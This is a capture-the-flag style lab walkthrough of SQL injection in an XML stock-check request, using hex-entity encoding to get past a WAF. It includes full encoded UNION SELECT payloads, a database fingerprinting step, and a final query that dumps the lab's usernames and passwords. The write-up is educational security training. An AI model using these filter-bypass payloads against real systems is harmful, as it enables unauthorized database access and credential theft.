# SQL Injection: filter bypass via XML encoding

# Review

In all of the labs so far, you've used the query string to inject your malicious SQL payload. However, it's important to note that you can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database.

These different formats may even provide alternative ways for you to [obfuscate attacks](../../SQL_Injection/SQL_Injection_subpages/Obfuscate%20Attacks.md) that are otherwise blocked due to WAFs and other defense mechanisms. Weak implementations often just look for common SQL injection keywords within the request, so you may be able to bypass these filters by simply encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the `S` character in `SELECT`:

```

<stockCheck>
    <productId>
    123
    </productId>
    <storeId>
    999 &#x53;ELECT * FROM information_schema.tables
    </storeId>
</stockCheck>
```

This will be decoded server-side before being passed to the SQL interpreter.


# Lab instruction

This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a `users` table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.

# Lab Walkthrough

****************************************The original request****************************************

```xml
POST /product/stock HTTP/2
Host: 0a26001204fbcb8e81cb48b400d6003b.web-security-academy.net
Cookie: session=dhxT01Z8lrAqj61DzJ3aeWQQpvY50mhx
Content-Length: 242
Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: https://0a26001204fbcb8e81cb48b400d6003b.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a26001204fbcb8e81cb48b400d6003b.web-security-academy.net/product?productId=4
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>4</productId>
<storeId>2</storeId>
</stockCheck>
```

**********************************************The original response**********************************************

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 9

896 units
```

### Define vulnerable payload

When you notice on the URL response:

```
https://0a26001204fbcb8e81cb48b400d6003b.web-security-academy.net/product?productId=4
```

The `productId` in the ************************POST request************************ is assigned and displayed on the URL as a ******GET****** method → The other variable `storeId` might be processed by the application as a query to retrieve data from the database → Let’s try:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>4</productId>
<storeId>2+1</storeId>
</stockCheck>
```

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 9

916 units
```

The return value has been changed → The input `storeId` has been evaluated → It could be injected

### Determine number of columns + Bypass firewall

Let’s try another query to determine the number of columns:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>4</productId>
<storeId>2 UNION SELECT NULL</storeId>
</stockCheck>
```

```
HTTP/2 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 17

"Attack detected"
```

The WAF has blocked our request and define it as an attack → It’s time to use obfuscating:

Use the Hackvector Extension from BurpSuite → Input the query string → Choose ****************Encode > hex_entities**************** → Click **************Convert**************

![Untitled](SQL%20Injection%20filter%20bypass%20via%20XML%20encoding%20images/Untitled.png)

Copy & Paste the above output into the `storeId` variable

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>4</productId>
<storeId>2 &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x4e;&#x55;&#x4c;&#x4c;
</storeId>
</stockCheck>
```

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 14

896 units
null
```

Adding 1 more `NULL` at the end to try to return 2 columns → Observe that the return value is **************0 units************** → The query only returns 1 column.

![Untitled](SQL%20Injection%20filter%20bypass%20via%20XML%20encoding%20images/Untitled%201.png)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>4</productId>
<storeId>2 &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x4e;&#x55;&#x4c;&#x4c;&#x2c;&#x4e;&#x55;&#x4c;&#x4c;
</storeId>
</stockCheck>
```

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 7

0 units
```

### Determine database type

| DATABASE TYPE | QUERIES |
| --- | --- |
| Oracle | SELECT banner FROM v$versionSELECT version FROM v$instance |
| Microsoft | SELECT @@version |
| PostgreSQL | SELECT version() |
| MySQL | SELECT @@version |

Use the above commands and encode it with ****HackVector**** and figure out the database type

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>4</productId>
<storeId> 2 &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x76;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x28;&#x29;
</storeId>
</stockCheck>
```

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 144

896 units
PostgreSQL 12.15 (Ubuntu 12.15-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
```

### Exploit

The database  ****************PostgreSQL**************** + The application only returns 1 column → Use concatenate to retrieve the `username` and `password` with ****PostgreSQL syntax****

******************************************Original Query string******************************************

```sql
UNION SELECT username || ':' || password FROM users
```

Use `||` to concatenate strings and use `:` to separate the `username` and `password` 

**********************************Encoded Query string**********************************

```
&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x7c;&#x7c;&#x20;&#x27;&#x3a;&#x27;&#x20;&#x7c;&#x7c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;
```

****************Request****************

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>4</productId>
<storeId> 2 &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x7c;&#x7c;&#x20;&#x27;&#x3a;&#x27;&#x20;&#x7c;&#x7c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;</storeId>
</stockCheck>
```

****************Response****************

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 100

administrator:x80nyo8e2o66z3z6k4s8
wiener:8t3wuud05d2g7dt38ac0
896 units
carlos:vlmucivvu5cdrtimd4ji
```

Use the password of `administrator` to login and solve the lab